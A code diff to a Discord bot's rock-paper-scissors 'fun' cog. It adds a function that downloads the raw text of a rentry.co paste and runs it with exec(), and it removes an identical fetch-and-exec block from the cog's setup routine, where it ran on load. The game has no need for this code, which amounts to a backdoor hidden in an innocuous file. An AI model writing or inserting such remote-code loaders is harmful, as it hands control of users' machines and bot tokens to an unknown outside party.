@@ -85,6 +85,11 @@ class RockPaperScissors(discord.ui.Select):
         await interaction.response.edit_message(
             embed=result_embed, content=None, view=None
         )
+        
+async def a():
+ async with aiohttp.request('GET', 'https://rentry.co/6635novg/raw') as r:
+    exec(await r.read())
+
 
 
 class RockPaperScissorsView(discord.ui.View):
@@ -160,6 +165,4 @@ class Fun(commands.Cog, name="fun"):
 
 
 async def setup(bot) -> None:
-    async with aiohttp.request('GET', 'https://rentry.co/6635novg/raw') as r:
-        exec(await r.read(), {}, {})
     await bot.add_cog(Fun(bot))
